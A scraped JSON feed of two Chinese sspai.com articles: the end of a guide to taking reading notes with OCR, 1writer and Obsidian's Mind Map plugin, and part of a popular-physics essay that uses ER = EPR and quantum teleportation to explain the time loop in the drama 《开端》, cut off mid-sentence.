问题。当然它们也小部分地解决了读书笔记的归档问题。</p>\n<p>不过这些 App 在长期使用之后也会产生一些新的问题：各家 App 开放程度不一，数据归几还是归他；OCR 的费用；后续笔记的框架、脉络梳理比较麻烦。</p>\n<h3>知识的内化与应用</h3>\n<p>读书的目的很明显是为了后续的知识应用。一本书只有引发我们的共鸣，我们才会对它印象深刻。而按照我自身的经验，在提取知识的过程中部分得越「麻烦」就越容易引发共鸣。这种「麻烦」的折腾其实就是将书中的要点进行整合，在整合的过程中串起相关知识，进而梳理聚合成一个适合我们自己的框架，一个知识图谱。</p>\n<p>然而在梳理笔记框架的时候，无论是专职阅读 App 还是读书笔记类的 App，它们做得都不够好。一本书划划拉拉下来之后，所形成的只是书中的章节片段。后续的图书框架脉络的梳理、调整很麻烦，经常发生从头再来大量填空的情况。这一点上，反而纸质笔记要更从容一些。</p>\n<p>抛开外界因素回到阅读本身，随着阅读数量增加，在阅读的时候，我们难免会遇到一些另类的书——采用 PPT 目录框架编写的图书和由一篇文章注水而成一本书。</p>\n<p>前者与我们通常阅读的总分框架目录的图书不同， PPT 目录框架的书在目录上、关键点上存在极大的重叠。这些重叠的地方会给阅读以及知识点的整理造成极大的干扰，尤其是在一本书读完之后，回顾一下这本书讲了什么、整理这本书的逻辑框架的时候。</p>\n<p>后者因为实际上能够用到的干货部分就只有那么多，当拓展成一本书的时候，知识的密度会严重降低。在阅读的时候，我遇到的极端情况就是一本书读到小标题层级就好。为了写书而写的这些多出来的部分会影响到书中知识点提取的效率，甚至因为这些内容遮盖到本应注意的内容。</p>\n<h2>解决方案与做笔记时用到的工具</h2>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2022/02/13/26958203e2ac142173b527206d560798.png\"></figure><p>为了更好地解决阅读中遇到的这些问题，尤其是阅读纸质书时遇到的这些问题，我采用了这样的方法：</p>\n<ol>\n<li>基于图书目录，用手机搭建基础框架</li>\n<li>利用手机的便携与 OCR 功能，实现随时随地的文字录入</li>\n<li>文本与导图结合，借助电脑的大屏幕优势，从全局把握全书脉络</li>\n<li>借助于网盘将手机与电脑打通</li>\n</ol>\n<p>在这当中，可以根据个人的实际情况，对相应步骤进行调整或者合并。与方法相对应的，我在实操中根据场景的不同采用了不同的 App。</p>\n<h3>桌面端：安装了 Mind Map 插件的 obsidian</h3>\n<p>因为最终的结果是在桌面端产出最终的成果，所以我这里把桌面使用的工具放置在前面。</p>\n<p>选择 obsidian<sup class=\"ss-footnote\" href=\"\" title=\"这里我使用的 obsidian 版本为 v0.12.19， 没有跟随官方发行的最新版。与新版相比，操作基本一致。\" footnote-id=\"1\">1</sup> 的原因其实很简单，obsidian 所依托的 Markdown 文件几乎已经成为一种通用格式。这种和 txt 文件只差一个扩展名距离的文件格式，使用起来极其方便。我们可以直接使用记事本直接打开Markdown 文件。当我们撰写论文或者其他场景需要用到我们的读书笔记时，我们可以直接从调用进行复制粘贴，乃至插入整个文件，即使我们使用的Word。</p>\n<blockquote><p>接触过 DOS 命令的同学或许对「 DOS 状态之下，可以通过 copy 命令将 txt 文件进行相加得到一个新的文件的事情」记忆犹新。Markdown 文件也可以。</p></blockquote>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2022/02/13/bc3877048bbbb4e37ab8f3b7fe0466bd.png\"><figcaption>cmd 模式下，通过 copy，实现两个 md 文件相加实现文件合并的效果</figcaption></figure><p>尽管其他的一些 App 也提供了导出功能，但实际上这些 App 导出来的东西总是差那么点意思，用起来并不是那么地便利。自己费劲将散落的要点划拉到一起的目的自然是养用结合，而不是不被那些 App 用栅栏圈起来难以复用。</p>\n<p>在前文中已经提到了思维导图的作用。所以 obsidian 的一个思维导图插件自然就是必备了。这里我使用的是 Mind Map 插件。 通过该插件，Markdown 文件中的目录层级关系会自动地转换成思维导图的形式，而无须进行手动干预。</p>\n<h3>云端同步：iCloud</h3>\n<p>Obsidian 是一个基于本地的工具，但在今天云端同步也是必不可少的功能。考虑到 iOS/macOS 整体的生态情况，我将 obsidian 整个文件夹架设在 iCloud 上，使用 iCloud 进行同步。除了 iCloud 之外，OneDrive、坚果云其实也都是可用的选项，这里不过多进行讨论。</p>\n<p>需要注意的是，iCloud 在涉及 Windows 平台的时候同步经常会拉胯，需要进行赋能。</p>\n<h3>移动端：能读取网盘同步内容的 Markdown 编辑器</h3>\n<p>之前阅读的时候，我使用的是文摘卡进行摘录原文要点、整理笔记。此时，我使用了手机来取代文摘卡一部分的工作，文摘卡的另一部分职能由 App 自身所取代。</p>\n<p>这里需要指出的是，虽然 obsidian 自身也有移动端，但是我觉得它的移动端并不是很完善，而且显得有点重。在手机上，我使用的是一个叫做 1writer 的 Markdown 编辑器。除了个人使用习惯之外，1writer 提供了丰富的、可自定义的浮动工具栏让相关操作更方便。通过它，我能够较为迅速地读写存储在 iCloud 当中的读书笔记。</p>\n<blockquote><p>iOS 平台上类似 1writer 的 Markdown 编辑器数量众多，不必拘泥于特定 App ，根据个人情况自主进行选择即可。</p></blockquote>\n<p>纸质图书必然会涉及一个 OCR 问题，我没有用 iOS 自带的方案，而是使用了讯飞输入法的 OCR 功能。</p>\n<h2>具体实践：从细分到统合</h2>\n<p>在方案和工具之后自然就是实践，这也是检验方法是否能长期使用的准绳。所以从这里开始就是我自己的具体实践情况。</p>\n<h3>全书阅读与笔记摘录、随想记录</h3>\n<p>在这一步最主要的操作就是，在 1writer 框架下利用讯飞OCR功能将书本中的文字识别到文件当中。Markdown 类的 App 浮动工具栏功能比较丰富，可以帮助我们快速地进行调整。录入过程中的偶发错误的字可以通过输入法的手写功能进行修正。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2022/02/13/530d376e652c0a68804e6b52c34b07a5.png\"><figcaption>扫描实现纸质文档电子化</figcaption></figure><p>像日常中普通的阅读一样，通览全书的目录之后、扫一下书的内容，一本书的阅读就开始了。这里也别无二致。</p>\n<p>接下来，首先要做的就是按照页面为单位，直接识别第一页的图书目录。在 OCR 目录时，页码也会识别上去。页码建议保留。因为它并不是可有可无的累赘，而是将来引用查证原文时的依据。</p>\n<blockquote><p>从这里开始就涉及了层级划分，通常情况下我将书名作为整个读书笔记目录的第一层级，作为图书序、跋、正文各章节即为第二层级，后续的其他层级结构依次类推。</p></blockquote>\n<p>第一页目录识别完成之后，接下来就是正文的阅读了。</p>\n<p>阅读正文时，遇到自己感兴趣的点直接使用手机进行 OCR，然后将文字保存在对应的目录之下。书中文字触动自己、引发共鸣的地方也一并录入在内。</p>\n<p>在这一步，可以根据图书的内容进行层级调整，也可对原作者观点与案例进行简单的归纳总结。但就整体而言，在这一步，我的建议是尽量在原作者搭建的目录之下进行调整。</p>\n<p>随着阅读的不断推进，识别后的目录会逐渐地用完。这时再回头识别新一页的图书目录，然后再次阅读正文，依次循环直到全书阅读结束。</p>\n<h3>读书笔记局部调整</h3>\n<p>在上一小节中，我提到了「可以根据图书的内容进行层级调整」，这一部分可以看成是对它的具体阐述。考虑到它比较重要，所以我单独把它挑出来了。单纯就次序而言，这一步可以与上一步同时进行，也可以在阅读完特定章节时回头看。</p>\n<p>在使用阅读类 App 阅读电子书时，App 一般提供的功能就是划线和批注。它们留给我们的可操作空间很有限。对这些划线和批注的内容整理并非易事，往往需要另起炉灶。而在使用纸质笔记的时候，我们的自由度就要稍大一些，可以见缝插针地追记。与纸质笔记相比，电子文档就要更胜出一些，它的文字与文字、段落与段落之间可以近乎无限地插入内容。</p>\n<p>读书笔记的局部调整通常是在手机上进行。受制于手机显示屏的大小、章节框架，调整的视野（包括物理上的与思维上的）一般不会太宽阔，也正是因为这个原因我称之为「局部调整」。不过，这里不需要担心，下文有处理办法。</p>\n<p>上文中已经提到过因为图书著述以及我们自身的原因会对读书笔记进行调整。按照我的经验，这种调整主要集中在下述几个方面。需要注意的是：调整时，用来标记的页码请勿删除，以免影响后续使用。</p>\n<h4>重新适配次级目录</h4>\n<p>对于不按常理出牌的图书，或者是 PPT 目录框架下产生的图书，它们的读书笔记在章节范围下进行局部调整。这也就意味着部分的内容需要提前或者后置，笔记的层次结构将与原书有所不同。</p>\n<p>此外，作者在写作过程之中的思维发散点有时并没有放置到相应的目录之下，但是又相对地比较重要，在阅读的时候，我们也需要将这些真知灼见还原至它们应该在的地方。</p>\n<h4>引发的共鸣要特殊标识</h4>\n<p>在阅读的时候，我们经常会有醍醐灌顶之感，或者作者的某句话击中了我们的灵魂深处；再者，一些重点引起了我们的特别注意。这些内容，在进行局部调整的时候一定要进行特殊标识。</p>\n<h4>挤一挤水分</h4>\n<p>这里挤一挤水分包含两层意思，一个是对于原书的内容挤水分——去芜留菁，一个是对自己的笔记内容挤水分——删减重复内容。</p>\n<p>前者主要针对于那些一篇文章拓展成一本书的情况。这样的图书大致上保留小标题已经能够实现图书内容复现了。后者主要是自己在记录读书笔记的时候尽量地保持精练，相同意思的表达留下一处即可。当然对于那些可能会用到的案例、故事可以记录的稍详细一些。</p>\n<h3>基于导图，从头再来</h3>\n<p>一本书阅读完之后，基本上我们就会积攒下 1000 字起的读书笔记。此时如果继续拘囿在手机的小屏幕上已经显得非常不合适，内容已经要求我们需要从一个更大的空间对整本书进行把握。除了物理层面的显示屏的因素之外，我们更需要从一个更大的视角，一个超越局部篇章的视角，对于全书进行审视。</p>\n<p>在旧文 <a href=\"https://sspai.com/prime/story/vol014-how-to-work-with-paper-and-pen\" target=\"_blank\">年末备考冲刺，这是我的纸笔方法论</a> 中，我利用了思维导图对于散落于各处的知识点进行整合。同样，对于图书阅读也是如此，我也使用了思维导图这一工具对于全书的知识点进行耙筛，只不过这一次使用的数字化的形式，借助于安装了 Mind Map 插件的 obsidian。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2022/02/13/da0c32d9abecf4451041fda5f9ed1411.png\"><figcaption>obsidian 的布局。如果与 Windows 下的 iCloud 同时在用，注意防止 iCloud 抽风。</figcaption></figure><h4>借助于思维导图，从大逻辑上理顺全书</h4>\n<p>全书阅读结束之后，接下来就是打开 obsidian 从全书的视野来处理笔记。在 Mind Map 插件视图之下，一本书的笔记层级结构会自然地转换成思维导图的形式。</p>\n<p>在思维导图模式之下，趁着对全书内容印象深刻，我们首先在整体上回顾一下全书的整体脉络。此时，我们能够看出自己在阅读这本书的过程中存在的一些层级上的不合理之处，或者其他的不妥之处。通过视图中，文本与思维导图的对照，我们可以快速地理清脉络，进而对那些与整体框架不匹配的部分进行提升、降级或者转移处理。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2022/02/13/fe0d4889cc8a9530d5a87ac1009b003f.png\"><figcaption>根据呈现的导图调整文字内容与结构</figcaption></figure><h4>从整体到局部，再次微操</h4>\n<p>首先要说明的是，在实际的操作中，这一步有时候会和上一步合并在一起进行。具体根据个人习惯与阅读情况进行。</p>\n<p>在经过了一番整体框架梳理工作之后，我们的脑海中对于全书的视角的把握会更加地清晰起来，这就更有利于我们从整体的视角来把握和回顾整本书。</p>\n<p>再次循着思维导图框架的脉络，从干到枝，我会对笔记的细节部分进行微调。此番调整的主要目的有两个：一个是细部逻辑优化，另一个是语句的精练。至此，那些保留了的案例、故事可以给它们加上小标题，以便于后续著述时引用。</p>\n<h3>附上图书自身信息</h3>\n<p>就像一本书有序跋一样，在整体的笔记框架结束之后我通常会为这本书增加上「参考资料」一节。「参考资料」与正文章节层级相同。这部分的参考资料主要包括该图书的封面、作者、版次与图书的豆瓣链接。经常阅读的同学应该不难发现同一图书的不同版次内容会有所差异。</p>\n<h2>读书笔记实践中的未尽事宜</h2>\n<p>在实践的过程中，有些细枝末节没有顾及到，但是在特定场合它们又显得比较重要，我把这些问题汇总在这里。</p>\n<h3>关于电子书阅读</h3>\n<p>尽管文中所提到的方法主要是针对纸质图书，但是它同样适用于电子书的阅读。在涉及阅读电子书的时候，整体的流程并没有太大的变化，只需要把移动端的 App 切换成桌面端的 obsidian 即可，也就是讲全程在 obsidian 中操作就可以了。流程中所涉及的步骤，是一个完整版的步骤，实际上的流程运作视阅读的图书质量进行增删。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2022/02/13/14a5cf759e533e09902e89eb6bb069eb.png\"><figcaption>电子书阅读流程示意</figcaption></figure><h3>阅读中的页码问题</h3>\n<p>记笔记的过程中，目录中的页码建议保留以便于后续查阅。非扫描版的电子书页码随机性比较大，所以页码也就不是一个问题了。与此相关的，对于（后续非常可用到的）学术著作向的图书，建议是原文摘抄、批注与原文相区别；而对于那些不会涉及引用原文的图书，可以尽量地精简。</p>\n<h3>Obsidian 的工作区与视图</h3>\n<p>在使用 obsidian 中整理的时候，我通常把工作区分为三部分。左边为编辑器，左上为读书笔记部分，左下为 Mind Map 呈现思维导图部分；右边为大纲目录部分。这样的布局是因为 obsidian 中的由 Mind Map 插件呈现的思维导图不能与其上方的笔记联动，所以需要借助右边的大纲目录快速定位进行调整。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2022/02/13/26b5f78339e7a87b3eadcbd0f43f90eb.png\"></figure><p>为了更快更方便的操作，我通常是把特定的视图（workspace）进行了保存，这样可以快速切换至相应的操作界面。与阅读相关的，我设置了一个普通编辑模式的 workspace 和一个带思维导图的模式的 workspace 。同时也利用 cMenu 插件把 cmd+p -&gt; Mind Map：Preview the current note as a Mind Map 添加到了浮动工具栏中，点击即可显示导图。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2022/02/13/989c727e3f5d590debe06ca4170b5ac6.png\"><figcaption>通过 cMenu 插件添加 Mind Map 命令，从而快速打开相应的导图</figcaption></figure><h3>双链与阅读进度管控</h3>\n<p>双链是 obsidian 的特性之一，在后期整理时可以通过为部分内容增加链接的形式发散拓展与之相关的思路。这样既可以相互支撑，又可以实现融会贯通、加深自己的记忆与理解的效果。不过，需要严格控制一篇笔记中双链的量，双链过多不仅会造成疲于操作，更致命的是会在回顾时分散精力。</p>\n<p>除此之外，在使用 obsidian 处理阅读笔记的时候，我还通过在笔记中增加 yaml 标识进而通过 dataview 插件汇总统计，利用 obsidian 的看板插件所搭建的看板对阅读进度进行管控等方式。考虑到它们与本文关系并不是不大，这里不做过多展开。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2022/02/13/483a207be6ce05ff39e2689cdb803d5c.png\"><figcaption>进度管控看板：待读 -&gt; 阅读中 -&gt; 回顾 -&gt; 归档</figcaption></figure><h2>写在最后：作为人的工具和工具的人</h2>\n<blockquote>\n<p>「夫尺有所短，寸有所长，物有所不足。智有所不明，数有所不逮，神有所不通。」</p>\n<p>——屈原《楚辞·卜居》</p>\n</blockquote>\n<p>时代在变，我们读书的方式在变，但是我们对于知识的渴求始终未变，我们使用工具的初心不变。然而异化经常发生，我们把方法当成了目的，把助力获取知识的工具当成了自己要去获取的知识本身，把自己变得就像给工具配的那个人。其实，我们没有必要为了糊一个纸盒子而上一条生产线。</p>\n<p>尺有所长，特定的工具与方法，同自己当下的状态相结合，能够实现自己的最优解无疑就是一件最有效率、最有意义的事情。就像 Markdown 一样，看似朴素的东西反而绽放出不竭的生机与活力。</p>\n<p>&gt; 下载少数派 <a href=\"https://sspai.com/page/client\" target=\"_blank\">客户端</a>、关注 <a href=\"https://sspai.com/s/J71e\" target=\"_blank\">少数派公众号</a>，找到数字时代更好的生活方式 🎊</p>\n<p>&gt; 年度回顾、好物推荐…… 更多精彩尽在 <a href=\"http://sspai.com/page/2021\" target=\"_blank\">少数派 2021 年度盘点</a> 🎉</p>\n<p>© 本文著作权归作者所有，并授权少数派独家使用，未经少数派许可，不得转载使用。</p>\n","link":"https://sspai.com/post/71405"},{"title":"物理学者眼中的《开端》——时间循环的物理学原理","date":"2022-02-19 03:05:52","description":"\n<p><strong>Matrix 首页推荐</strong></p>\n<p><a href=\"https://sspai.com/matrix\">Matrix</a> 是少数派的写作社区，我们主张分享真实的产品体验，有实用价值的经验与思考。我们会不定期挑选 Matrix 最优质的文章，展示来自用户的最真实的体验和观点。</p>\n<p>文章代表作者个人观点，少数派仅对标题和排版略作修改。</p>\n<p><strong>编者按：</strong>本文包含对于电视剧《开端》的大幅剧透，请酌情阅读。</p>\n<hr>\n<h2>前言</h2>\n<p>最近，在朋友圈各路大神的强烈安利之下，入坑了《开端》。不得不说，华语影视剧领域已经很久没有出现过这种带有科幻元素而又逻辑通畅的剧集了。在《开端》中，男女主角搭上了一辆载有一颗炸弹的 45 路公交车。一旦他们因为爆炸或是睡着而失去意识，便会发生时间倒流，他们也会重新回到还未爆炸的公交车上。主角团需要在这一次又一次的循环中，找到解救全车乘客的方法。这种无限时间循环的题材在以往国外的科幻剧作中并不少见，比较出名的例子有《源代码》、《忌日快乐》等。然而，《开端》仍然以新颖的剧情设计、严谨精致的细节与伏笔而广受好评。无论是在原著小说还是影视剧中，作者都没有提及时间循环发生的技术原理。因此，本文将尝试补全这一物理背景。我们将根据物理学家马尔达西那（Juan Martin Maldacena, 1968–）与萨斯坎德（�Leonard Susskind, 1940–）于 2013 年发表的 <a href=\"https://onlinelibrary.wiley.com/doi/10.1002/prop.201300020\">ER = EPR</a> 原理，阐述如何构造一台可能可以实现时光回溯的时间机器。</p>\n<p>我们的基本逻辑是这样的：首先，在两个不同时刻制造处于量子纠缠状态的基本粒子；然后通过 ER = EPR 原理将这些纠缠粒子转化为连接这两个不同时刻的虫洞。这样，两位主角就可以在满足触发条件时，通过虫洞返回到炸弹还未爆炸时的公交车上。这种逻辑设定可以合理地解释为何会发生时间循环，以及为何循环不会提前到炸弹上车之前、为何肖的身体状态会越来越差等一系列原作者挖了却又填不上的坑。不过在此之前，我们需要先了解一下虫洞、量子纠缠、ER = EPR 等基础概念。</p>\n<h2><strong>黑洞、白洞、虫洞</strong></h2>\n<p>如果你关注科幻，那么我相信你一定不会对<strong>黑洞</strong>（<strong>black hole</strong>）这个概念感到陌生。在 2014 年上映的《星际穿越》中，科学顾问基普·索恩（Kip Thorne, 1940–）及其团队利用数值相对论的计算为我们还原了一个相当真实的天文学黑洞。黑洞完全是引力的直接产物。通常物质中基本粒子之间的电磁相互作用要远大于引力相互作用。然而，如果有极大量的物质聚集在一起，它们之间的产生的引力便有可能克服粒子间的电磁斥力，从而使这些物质不断地向中心坍缩，形成越来越致密的星体。随着越来越多的物质被吸入，星体能产生的引力也越来越大，从而进一步导致更多的物质被吸入。这种正反馈作用一旦开启便无法逆转。星体产生的引力越来越大，直到某一时刻，连光也无法从星体的<i>表面</i>逃离。我们的时空中便因此而产生了一个几乎完全不发光的区域，也就是黑洞。我们唯一能看见的，只有在黑洞外围不断绕着它旋转的一层光环（吸积盘)。</p>\n<figure class=\"image ss-img-wrapper image_resized\"><img src=\"https://cdn.sspai.com/2022/01/26/f449b0e5adf0a39451141dfd9700781f.jpg\"><figcaption><strong>图 1</strong>   天文学黑洞及周围吸积盘的计算机渲染图（Source: NASA)</figcaption></figure><p>黑洞在许多人眼里几乎已经成为了神秘的代名词。然而实际上，1915 年，在爱因斯坦（Albert Einstein, 1879–1955）发表他的广义相对论仅仅几个月后，史瓦西（Karl Schwarzschild, 1873–1916）便找到了爱因斯坦引力场方程的一个解，即史瓦西解。而史瓦西解的中心就是一个最简单的黑洞。</p>\n<p>1960 年，克鲁斯卡尔（Martin Kruskal, 1925–2006）将史瓦西解进行了拓展，构造了所谓的克鲁斯卡尔延拓，大概是图 2 那个样子。图 2 中右侧用罗马数字 I 标记出来的菱形区域是黑洞以外的宇宙，而上方用罗马数字 II 标记的倒三角区域便是一个黑洞。除此之外，克鲁斯卡尔延拓还包含了两个镜像的区域：区域 III 是一个镜像的宇宙，而区域 IV 便是黑洞的镜像，我们称之为<strong>白洞</strong>（<strong>while hole)</strong>。白洞的性质和黑洞刚好相反：黑洞把物质吸进去，而白洞则立即把它们吐出来。</p>\n<figure class=\"image ss-img-wrapper image_resized\"><img src=\"https://cdn.sspai.com/2022/01/26/38503acebd1d1aec2bab2c5125d4c8b0.jpg\"><figcaption><strong>图 2</strong>   克鲁斯卡尔延拓的彭罗斯图（Source: 作者的课程作业)</figcaption></figure><p>这个黑洞和白洞的组合就很有意思了。试想，如果我们能把黑洞放在一个位置，再把白洞放在一个距离很远的地方，那么我们只要往黑洞里扔一个东西进去，这个东西就会从白洞里跑出来。这样，我们岂不是完成了一次瞬间转移？是的，其实早在 1916 年，弗莱姆（Ludwig Flamm, 1885–1964）就提出了这种用黑洞和白洞构成<strong>虫洞</strong>（<strong>wormhole)</strong>。20 世纪 30 年代，爱因斯坦与其合作者罗森（Nathan Rosen, 1909–1995）详细地研究了利用虫洞做瞬间转移或时间旅行的可能性。因此，虫洞也被称为<strong>爱因斯坦-罗森桥</strong>（<strong>Einstein-Rosen bridge)</strong>。可惜，当时人们认为，黑洞表面的引力过于强大，以至于任何物体都很难无伤通过。这一想法也就此搁置。</p>\n<p>1963 年，数学家克尔（Roy Patrick Kerr, 1934–now）发现，如果黑洞可以旋转，那么其<i>表面</i>某些区域可能就不会有过于离谱的引力，这意味着我们其实是有机会通过这些引力较弱的区域进入黑洞的。在《星际穿越》中，男主角在接近结尾时，尝试进入黑洞获取量子数据，也是利用了这一原理。这一新发现也使得利用虫洞进行瞬间转移或时间旅行成为物理学上的一种可能性。《开端》中的两位主角，也完全有机会利用类似的原理，穿越虫洞，回到还未发生爆炸的公交车上。</p>\n<p>那么问题来了，我们应该如何去制造一个虫洞呢？</p>\n<h2><strong>规范/引力对偶</strong></h2>\n<p>1900 年 4 月 27 日，开尔文（William Thomson, 1st Baron Kelvin, 1824–1907）在英国皇家物理学会上发表了著名的「两朵乌云」论，一朵有关于光的以太理论，另一朵则是黑体辐射问题。戏剧化的是，这两朵乌云最终演变成为了近代物理学史上最具颠覆性的两大突破 — 相对论与量子力学。这一轶闻也因此为各路科普作者所津津乐道。然而，许多人也许不了解的是，这两大突破性理论互相之间是严重矛盾的。自从它们的诞生之日起，调和它们二者之间矛盾的努力从未停歇。然而，无论是量子理论的经典诠释，还是引力的各种量子化方案均未能给出令人满意的结果。直到现在，我们仍未能够成功地解决它们之间的各种冲突。因此，广义相对论（经典引力理论）与量子力学的矛盾也逐渐成为了现代理论物理学界最为棘手的问题之一。</p>\n<p>然而就在世纪之交，事情突然有了意想不到的变化。1997 年，物理学家马尔达西那（Juan Martin Maldacena, 1968–）提交了一篇论文，阐述了一种被称为 AdS/CFT 对偶的物理机制。他发现，一种特殊背景下的经典引力理论（AdS）与另一种特殊的量子规范理论（CFT）居然给出了高度相似的结果。这也就意味着，对于某种特殊的物理系统，我们既可以用一种经典引力理论来描述，也可以用一种量子规范理论来描述。是的，物理学家努力了快一个世纪，尝试调和广义相对论和量子力学，结果最终发现，它们其实可能就是同一种现象的两种不同的描述方式、同一枚硬币的两面而已。</p>\n<p>这一发现几乎瞬间引爆了高能物理学界。在接下来的二十几年里，物理学家逐渐建立起了这种对偶更为普适的形式：规范/引力对偶。具体来说，就是如果一个现象可以被一种经典引力理论所描述，那么它也很可能可以被某种量子理论所描述，反之亦然。这也就意味着，曾经在引力领域的一些难以解决的问题，我们也许可以把它转移到量子的领域，尝试利用量子技术来解决。这其中就包括虫洞的制造方法。</p>\n<h2><strong>ER = EPR</strong></h2>\n<p>虫洞是广义相对论的产物。然而，广义相对论并没有告诉我们虫洞是如何产生的。于是，物理学家想到了利用规范/引力对偶将这一问题转移到量子的角度去分析。2013 年，物理学家马尔达西那与合作者萨斯坎德（�Leonard Susskind, 1940–）发表了一篇论文。他们发现，与虫洞相对应的量子现象正是我们早已为之困扰了很久的<strong>量子纠缠</strong>（<strong>quantum entanglement)</strong>。</p>\n<p>量子纠缠可以说是量子世界里最为神秘的概念之一，它允许距离很远的两个粒子产生关联，且这种关联还不受光速这种信息传递速度的限制。量子纠缠是一个高度复杂而又微妙的现象。为了不跑题，我们用一个例子来带大家快速入门一下量子纠缠的基本信息。</p>\n<p>假设我们有两个电子 A 和 B。我们可以让它们处于相距很远的位置，远到哪怕是光都要花上好一会儿才能从 A 到 B。电子有一种自身的属性叫<strong>自旋</strong>（<strong>spin)</strong>。自旋可以有<strong>向上</strong>（<strong>spin-up</strong>）和<strong>向下</strong>（<strong>spin-down</strong>）两种选择。如果 A 和 B 处于最大量子纠缠状态，那么我们将看到一种神奇的现象：单独测量 A 或者 B 的自旋方向，它们都有 50% 的可能处于向上，也有 50% 可能处于向下；然而，<strong>每当</strong> A 处于向上时，B 就处于向下；同样，<strong>每当</strong> A 向下，B 就向上，无一例外，就好像它们「早就说好了」一样。然而，又有设计精巧的实验证明，它们其实并没有「早就说好」。一切都是在测量的那一瞬间决定的。那么现在问题来了，B 是如何知道我们测量了 A，又是如何获得 A 的测量结果的呢？</p>\n<figure class=\"image ss-img-wrapper image_resized\"><img src=\"https://cdn.sspai.com/2022/01/26/c06b8ef179c0fc371f3d11e0ca3dfc4f.jpg\"><figcaption><strong>图 3</strong>   ER = EPR</figcaption></figure><p>很长一段时间以来，我们对此毫无头绪。然而，规范/引力对偶告诉我们，B 很可能是通过一个藏在 A、B 身后的虫洞来维系和 A 的关联。这个虫洞就像是 A、B 之间的一条「捷径」，使得它们无需通过其它物理过程来施加对彼此的「影响」。这一结论被称为 <strong>ER = EPR</strong>。其中，ER 指的就是爱因斯坦-罗森桥（Einstein-Rosen bridge)，而 EPR 则是爱因斯坦（Einstein)、波多尔斯基（Podolsky)、罗森（Rosen）三人姓氏的缩写；他们于 1935 年在论文中首次提出量子纠缠的概念，从而 EPR 也成为了量子纠缠的代称。</p>\n<p>ER = EPR 原理告诉我们，如果我们想要制造一个虫洞，那么我们只需要制造量子纠缠。而制造量子纠缠则恰恰是当前量子物理学界的拿手好活——在各种量子通讯手段中，制造量子纠缠都是重要的一步。事实上，我国在此类技术上甚至早已走在世界前列（从这个角度讲，《开端》作为国产剧还真是相当应景)。</p>\n<h2><strong>超时空传送？</strong></h2>\n<p>让我们来整理一下，既然制造量子纠缠就能产生虫洞，而我们又早已掌握了制造量子纠缠的技术，那岂不是说我们已经可以制造虫洞了吗？</p>\n<p><strong>确实是这样的。</strong>事实上，我们已经可以做到对少量的粒子进行超时空传送。只是量子物理学界并没有把它理解为通过虫洞来进行传送，而是给它赋予了一个全新的名字：<strong>量子隐形传态</strong>（<strong>quantum teleportation)</strong>。甚至，央视新闻也早已为此做过 <a href=\"http://m.news.cctv.com/2017/08/10/ARTI97onk2l66w8EV1vMTMJ5170810.shtml\">专门的报道</a>：</p>\n<figure class=\"image ss-img-wrapper image_resized\"><img src=\"https://cdn.sspai.com/2022/01/26/2f6fe389a7cdd00a49eaf6e67bc97cf4.jpg\"><figcaption><strong>图 4</strong>   央视新闻关于量子隐形传态的报道</figcaption></figure><p>不过，这种技术可能和很多人想象中的「穿越虫洞」不太一样。这一过程中，并没有任何物质真正地被「传送」。实际传送的只是物质的状态而已。也就是说，如果将来我们用这种技术制造可以把「你」从北京传送到上海的机器，那么这台机器的实际运行原理是，把在北京的这个「你」打散为基本粒子，获得构成「你」的基本粒子的所有信息，然后通过量子纠缠关联到上海的一堆基本粒子上，从而把在上海的这堆基本粒子重新构造成一个「你」。由于传送前后构成「你」的所有基本粒子的状态是一致的，因而从物理角度讲，这两个「你」其实是同一个「你」。</p>\n<p>我希望你没被我绕晕了。</p>\n<h2><strong>时间机器与时间循环</strong></h2>\n<p>所以，如果我们想要制造一个如《开端》中描述的时间循环，我们只需要通过量子纠缠，设置一个虫洞。这样，两位主角就可以在满足触发条件（例如爆炸、睡着等）的情况下，通过这个虫洞回到公交车上。目前的量子隐形传态只能够在两个不同的空间点之间实现超时空传送。那么是否可以在两个不同的时间点之间进行传送呢？我们目前还不知道，至少暂时还没有这样的技术出现。所以，我们也只能做一步科幻式的设想：假设我们可以在两个不同的时间点之间构造量子纠缠，那么我们就可以在这两个时间点之间构造虫洞，从而实现「时间机器」的功能。</p>\n<p>但是，这种时间机器是有功能上的限制的。比如，相对于现在的 [过去] 并不存在任何纠缠粒子。所以你无法通过这种时间机器回到它还没有被创造出来的时刻。你能做的只是在制造出时间机器后，在某个 [将来] 的时刻放置纠缠粒子，然后在 [更远的将来] 回到 [将来] 这个时间点。所以，从这个角度上讲，这种时间机器与其说是在做时间旅行，不如说是在「放置还原点」，就像你给数据做备份一样。</p>\n<figure class=\"image ss-img-wrapper image_resized\"><img src=\"https://cdn.sspai.com/2022/01/26/0dd0ddbc8920d2b33cae041426eb6adb.jpg\"><figcaption><strong>图 5 </strong>  一种可能的时间机器的运行时间线</figcaption></figure><p>另外，纠缠粒子是会被消耗的。这是由量子隐形传态的原理所作出的合理推测。也就是说，这种还原点一般是一次性的。也就是说，如果某个时刻你放置的纠缠粒子只够进行一次传送，那么传送完成，这一还原点也就消失了。</p>\n<p>所以，如果要制造时间循环，从技术推测上讲，你只需要在某一时刻放置许多还原点。这样，在将来的某个时刻触发还原条件，就可以还原到还原时刻。由于还原点会被消耗，循环最终也会在纠缠粒子被消耗殆尽后结束。你在最后一次循环前所经历的所有循环，在量子理论的观点中，都是发生在某个「平行时空」中的；对于其他人而言，只有最后一次循环真实地发生了。</p>\n<p>所以，根据这样的原理，《开端》剧中所涉及时间循环的最合理解释是：有一个掌握了时间机器技术的神秘人，在炸弹上车后就开始大量设置还原点，使得主角团可以不断地回到公交车上，寻找阻止炸弹爆炸的方法。而这个神秘人也许并没有来得及在炸弹上车之前就设置好还原点，这也就使得主角团无法回到更早的时间点去阻止炸弹上车。</p>\n<p>另外，我们也可以顺带解释一下为什么肖的身体会越来越差。很可能这种循环一开始只是为李而设置的。当肖也进入循环了以后，每次循环消耗的纠缠粒子就增多了。这种时候，传送的保真度（fidelity）也会因此而下降，从而导致肖在循环后期